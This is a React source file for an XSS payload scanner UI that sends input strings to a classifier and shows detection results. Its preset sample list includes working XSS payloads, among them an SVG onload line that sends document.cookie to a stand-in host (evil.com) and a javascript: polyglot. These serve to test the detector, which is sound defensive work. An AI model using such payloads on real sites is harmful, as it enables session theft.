// src/pages/Scanner.jsx
import { useState, useRef } from "react";
import {
  Shield,
  Search,
  Layers,
  RotateCcw,
  AlertTriangle,
  ChevronDown,
  Info,
  Clipboard,
  Zap,
  CheckCircle2,
  Sparkles,
  Lock,
  Clock,
  Cpu
} from "lucide-react";
import { predictSingle, predictBatch } from "../api/client";
import ResultCard from "../components/ResultCard";
import AIReviewComparison from "../components/AIReviewComparison";
import SeverityBadge from "../components/SeverityBadge";

const QUICK_PAYLOADS = [
  { label: "Classic Script", payload: `<script>alert('XSS')</script>`, type: "Script Tag" },
  { label: "IMG Onerror", payload: `<img src=x onerror=alert(document.cookie)>`, type: "Event Handler" },
  { label: "SVG Injection", payload: `<svg/onload=fetch('https://evil.com?c='+document.cookie)>`, type: "SVG Vector" },
  { label: "URL Encoded", payload: `%3Cscript%3Ealert%281%29%3C%2Fscript%3E`, type: "Obfuscated" },
  { label: "Protocol Injection", payload: `javascript:/*--></title></style></textarea></script><svg/onload=alert(1)>`, type: "Protocol" },
  { label: "Benign Sentence", payload: `Hello, this is a standard search query from a regular user.`, type: "Safe String" },
];

function saveToHistory(entry) {
  try {
    const existing = JSON.parse(localStorage.getItem("shieldscan_history") || "[]");
    localStorage.setItem("shieldscan_history", JSON.stringify([entry, ...existing].slice(0, 200)));
  } catch {}
}

function SingleScanner() {
  const [payload, setPayload] = useState("");
  const [result, setResult] = useState(null);
  const [latencyMs, setLatencyMs] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const textareaRef = useRef(null);

  const handleScan = async () => {
    if (!payload.trim()) return;
    setLoading(true);
    setError(null);
    setResult(null);
    try {
      const res = await predictSingle(payload.trim());
      setResult(res);
      setLatencyMs(res.latencyMs);
      saveToHistory({
        id: Date.now(),
        timestamp: new Date().toISOString(),
        payload: payload.trim(),
        is_xss: res.is_xss,
        risk_level: (res.severity ?? (res.is_xss ? "HIGH" : "SAFE")).toLowerCase(),
        confidence: res.xss_probability ?? 0,
        mode: "single",
        analyst_feedback: null,
      });
    } catch (e) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  const handleSelectPreset = (presetPayload) => {
    setPayload(presetPayload);
    setResult(null);
    setError(null);
    textareaRef.current?.focus();
  };

  return (
    <div className="space-y-6">
      {/* Workbench Input Card */}
      <div className="card overflow-hidden">
        {/* Card Header with Quick Actions */}
        <div
          className="flex items-center justify-between px-5 py-3.5"
          style={{ borderBottom: "1px solid var(--border)", background: "var(--bg-subtle)" }}
        >
          <div className="flex items-center gap-2">
            <Shield size={16} style={{ color: "var(--accent)" }} />
            <span className="text-sm font-bold" style={{ color: "var(--text-primary)" }}>
              Payload Inspection Console
            </span>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={async () => {
                try {
                  const text = await navigator.clipboard.readText();
                  if (text) setPayload(text);
                } catch {}
              }}
              className="btn-ghost flex items-center gap-1.5 text-xs px-2.5 py-1"
            >
              <Clipboard size={12} />Paste
            </button>
          </div>
        </div>

        {/* Textarea Area */}
        <div className="p-5 space-y-4">
          <textarea
            ref={textareaRef}
            value={payload}
            onChange={e => setPayload(e.target.value)}
            onKeyDown={e => {
              if ((e.metaKey || e.ctrlKey) && e.key === "Enter") handleScan();
            }}
            placeholder="Paste or type an untrusted payload string to analyze for Cross-Site Scripting patterns..."
            rows={5}
            className="input-base w-full resize-none text-sm rounded-xl p-3.5 leading-relaxed focus:ring-2"
          />

          {/* Quick Preset Chips */}
          <div className="space-y-1.5">
            <div className="flex items-center gap-1.5 text-xs font-semibold" style={{ color: "var(--text-muted)" }}>
              <Zap size={12} style={{ color: "var(--accent)" }} />
              <span>Interactive Sample Payloads:</span>
            </div>
            <div className="flex items-center gap-1.5 flex-wrap">
              {QUICK_PAYLOADS.map(preset => (
                <button
                  key={preset.label}
                  onClick={() => handleSelectPreset(preset.payload)}
                  className="text-xs px-2.5 py-1 rounded-lg border transition-all hover:border-emerald-500"
                  style={{
                    background: "var(--bg-subtle)",
                    borderColor: "var(--border)",
                    color: "var(--text-secondary)",
                  }}
                >
                  <span className="font-semibold text-emerald-400">[{preset.type}]</span> {preset.label}
                </button>
              ))}
            </div>
          </div>

          {/* Bottom Action Row */}
          <div className="flex items-center justify-between pt-3 border-t" style={{ borderColor: "var(--border)" }}>
            <div className="flex items-center gap-1.5 text-xs" style={{ color: "var(--text-muted)" }}>
              <Info size={12} />
              {payload.length} characters {payload.length > 0 && "· Press ⌘↵ / Ctrl+Enter to scan"}
            </div>
            <div className="flex items-center gap-2">
              {payload && (
                <button
                  onClick={() => {
                    setPayload("");
                    setResult(null);
                    setError(null);
                  }}
                  className="flex items-center gap-1.5 text-xs btn-ghost px-3 py-1.5"
                >
                  <RotateCcw size={12} />Clear
                </button>
              )}
              <button
                onClick={handleScan}
                disabled={!payload.trim() || loading}
                className="btn-primary flex items-center gap-2 text-sm px-6 py-2"
              >
                {loading ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                    Analyzing…
                  </>
                ) : (
                  <>
                    <Search size={15} />Scan Payload
                  </>
                )}
              </button>
            </div>
          </div>
        </div>
      </div>

      {error && (
        <div
          className="flex items-start gap-2.5 rounded-xl p-4"
          style={{ background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.25)", color: "#f87171" }}
        >
          <AlertTriangle size={16} className="shrink-0 mt-0.5" />
          <div>
            <p className="font-bold text-sm">Scan Error</p>
            <p className="text-xs mt-0.5 opacity-90">{error}</p>
          </div>
        </div>
      )}

      {result && (
        <div className="space-y-4 animate-fsu">
          <ResultCard result={result} latencyMs={latencyMs} payload={payload} />
          <AIReviewComparison payload={payload} result={result} />
        </div>
      )}
    </div>
  );
}

function BatchScanner() {
  const [rawInput, setRawInput] = useState("");
  const [results, setResults] = useState(null);
  const [summary, setSummary] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const payloads = rawInput.split("\n").map(l => l.trim()).filter(Boolean);

  const handleScan = async () => {
    if (payloads.length === 0) return;
    setLoading(true);
    setError(null);
    setResults(null);
    try {
      const res = await predictBatch(payloads);
      setResults(res.results);
      setSummary(res.summary || res);
      payloads.forEach((p, i) => {
        const r = res.results?.[i];
        if (r) {
          saveToHistory({
            id: Date.now() + i,
            timestamp: new Date().toISOString(),
            payload: p,
            is_xss: r.is_xss,
            risk_level: (r.severity ?? (r.is_xss ? "HIGH" : "SAFE")).toLowerCase(),
            confidence: r.xss_probability ?? 0,
            mode: "batch",
            analyst_feedback: null,
          });
        }
      });
    } catch (e) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="space-y-5">
      <div className="card overflow-hidden">
        <div
          className="px-5 py-3.5 flex items-center justify-between"
          style={{ borderBottom: "1px solid var(--border)", background: "var(--bg-subtle)" }}
        >
          <div className="flex items-center gap-2">
            <Layers size={16} style={{ color: "var(--accent)" }} />
            <span className="text-sm font-bold" style={{ color: "var(--text-primary)" }}>
              Batch Payload Inspection
            </span>
          </div>
          <span className="text-xs" style={{ color: "var(--text-muted)" }}>
            {payloads.length} payloads queued
          </span>
        </div>
        <div className="p-5 space-y-4">
          <textarea
            value={rawInput}
            onChange={e => setRawInput(e.target.value)}
            placeholder={"Paste payloads, one per line:\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\njavascript:alert(1)\nSafe sample query string"}
            rows={8}
            className="input-base w-full resize-none text-sm rounded-xl p-3.5 leading-relaxed"
          />
          <div className="flex justify-end">
            <button
              onClick={handleScan}
              disabled={payloads.length === 0 || loading}
              className="btn-primary flex items-center gap-2 text-sm px-6 py-2"
            >
              {loading ? (
                <>
                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  Scanning Batch…
                </>
              ) : (
                <>
                  <Layers size={15} />Scan {payloads.length > 0 ? `${payloads.length} Payloads` : "Batch"}
                </>
              )}
            </button>
          </div>
        </div>
      </div>

      {error && (
        <div
          className="flex items-start gap-2.5 rounded-xl p-4"
          style={{ background: "rgba(239,68,68,0.08)", border: "1px solid rgba(239,68,68,0.2)", color: "#f87171" }}
        >
          <AlertTriangle size={16} className="shrink-0 mt-0.5" />
          <p className="text-sm">{error}</p>
        </div>
      )}

      {summary && (
        <div className="card p-5 animate-fsu">
          <p className="text-xs font-bold uppercase tracking-widest mb-4" style={{ color: "var(--text-muted)" }}>
            Batch Execution Summary
          </p>
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            {[
              { label: "Total Tested", value: summary.total ?? payloads.length, color: "var(--text-primary)" },
              { label: "XSS Detected", value: summary.xss_count ?? results?.filter(r => r.is_xss).length, color: "#f87171" },
              { label: "Safe Payloads", value: summary.safe_count ?? results?.filter(r => !r.is_xss).length, color: "#34d399" },
              { label: "Avg Confidence", value: `${Math.round((summary.avg_confidence ?? 0) * 100)}%`, color: "#a78bfa" },
            ].map(s => (
              <div key={s.label} className="card-subtle p-3 text-center">
                <p className="text-2xl font-bold tabular-nums" style={{ color: s.color }}>{s.value}</p>
                <p className="text-xs mt-0.5" style={{ color: "var(--text-muted)" }}>{s.label}</p>
              </div>
            ))}
          </div>
        </div>
      )}

      {results && results.length > 0 && (
        <div className="card overflow-hidden animate-fsu">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead style={{ background: "var(--bg-subtle)", borderBottom: "1px solid var(--border)" }}>
                <tr>
                  {["#", "Payload", "Status", "Confidence", "Risk Tier"].map(h => (
                    <th key={h} className="text-left px-4 py-3 text-xs font-semibold uppercase tracking-widest" style={{ color: "var(--text-muted)" }}>
                      {h}
                    </th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {results.map((r, i) => (
                  <tr
                    key={i}
                    style={{
                      borderBottom: "1px solid var(--border)",
                      background: r.is_xss ? "rgba(239,68,68,0.04)" : "transparent",
                    }}
                  >
                    <td className="px-4 py-3 text-xs tabular-nums" style={{ color: "var(--text-muted)" }}>{i + 1}</td>
                    <td className="px-4 py-3 max-w-xs">
                      <code className="text-xs font-mono truncate block" style={{ color: "var(--text-secondary)" }}>
                        {payloads[i]}
                      </code>
                    </td>
                    <td className="px-4 py-3">
                      <span className="text-xs font-bold" style={{ color: r.is_xss ? "#f87171" : "#34d399" }}>
                        {r.is_xss ? "⚠ XSS Detected" : "✓ Safe Input"}
                      </span>
                    </td>
                    <td className="px-4 py-3 text-xs tabular-nums font-mono" style={{ color: "var(--text-secondary)" }}>
                      {Math.round((r.xss_probability ?? r.confidence ?? 0) * 100)}%
                    </td>
                    <td className="px-4 py-3">
                      <SeverityBadge level={(r.severity ?? (r.is_xss ? "high" : "safe")).toLowerCase()} size="sm" />
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      )}
    </div>
  );
}

export default function Scanner() {
  const [mode, setMode] = useState("single");

  return (
    <div className="max-w-4xl mx-auto space-y-6">
      {/* Executive Hero Banner */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-2 border-b" style={{ borderColor: "var(--border)" }}>
        <div>
          <div className="flex items-center gap-2 mb-1">
            <h1 className="text-2xl font-extrabold tracking-tight" style={{ color: "var(--text-primary)" }}>
              Threat Scanner Workbench
            </h1>
            <span
              className="text-[11px] font-bold px-2.5 py-0.5 rounded-full inline-flex items-center gap-1"
              style={{ background: "rgba(16,185,129,0.12)", color: "#34d399", border: "1px solid rgba(16,185,129,0.25)" }}
            >
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
              Engine Active
            </span>
          </div>
          <p className="text-xs sm:text-sm" style={{ color: "var(--text-secondary)" }}>
            Real-time screening using Calibrated Linear SVM with 3,000 character n-grams and 18 security indicators.
          </p>
        </div>

        {/* Feature KPI Badges */}
        <div className="flex items-center gap-2 flex-wrap">
          <div className="card-subtle px-3 py-1.5 flex items-center gap-1.5 text-xs font-mono">
            <Cpu size={12} style={{ color: "var(--accent)" }} />
            <span>0.20% FNR</span>
          </div>
          <div className="card-subtle px-3 py-1.5 flex items-center gap-1.5 text-xs font-mono">
            <Clock size={12} style={{ color: "var(--accent)" }} />
            <span>~0.005 ms</span>
          </div>
          <div className="card-subtle px-3 py-1.5 flex items-center gap-1.5 text-xs font-mono">
            <Lock size={12} style={{ color: "var(--accent)" }} />
            <span>100% Local</span>
          </div>
        </div>
      </div>

      {/* Mode Selector Tabs */}
      <div className="flex items-center gap-1 p-1 rounded-xl w-fit" style={{ background: "var(--bg-subtle)", border: "1px solid var(--border)" }}>
        {[
          { id: "single", label: "Single Payload Inspection", icon: Search },
          { id: "batch", label: "Batch Payload Analyzer", icon: Layers },
        ].map(({ id, label, icon: Icon }) => (
          <button
            key={id}
            onClick={() => setMode(id)}
            className="flex items-center gap-2 px-4 py-2 rounded-lg text-xs font-semibold transition-all"
            style={{
              background: mode === id ? "var(--bg-card)" : "transparent",
              color: mode === id ? "var(--accent)" : "var(--text-muted)",
              border: mode === id ? "1px solid var(--border)" : "1px solid transparent",
              boxShadow: mode === id ? "var(--shadow)" : "none",
            }}
          >
            <Icon size={14} />
            {label}
          </button>
        ))}
      </div>

      {mode === "single" ? <SingleScanner /> : <BatchScanner />}
    </div>
  );
}
